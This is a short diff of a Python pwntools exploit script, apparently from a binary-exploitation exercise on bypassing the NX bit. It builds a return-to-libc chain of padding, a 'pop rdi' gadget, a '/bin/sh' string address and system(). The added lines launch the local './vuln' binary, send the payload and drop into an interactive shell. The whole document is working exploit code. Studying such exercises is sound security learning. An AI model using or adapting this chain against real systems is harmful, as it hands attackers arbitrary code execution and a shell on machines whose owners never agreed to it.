@@ -1,16 +1,18 @@
 from struct import *
 from pwn import *
 
-base = 0x7ffff7dd7000
-rdi_add = 0x004011bb
-system = 0x7ffff7e20860
-arg = 0x7ffff7f6f882
+vuln = process("./vuln")
+base = 0x00007ffff7de6000
+rdi_add = 0x27c3d + base
+system = 0x49860 + base
+arg = 0x198882 + base
 shellcode = asm(shellcraft.sh())
 payload = b''
 payload += b'A' * 22
-payload += struct.pack('<Q', rdi_add)
-payload += struct.pack('<Q', arg)
-payload += struct.pack('<Q', system)
-
+payload += p64(rdi_add)
+payload += p64(arg)
+payload += p64(system)
+vuln.sendline(payload)
+vuln.interactive()
 file = open("nxbit", "wb")
 file.write(payload)
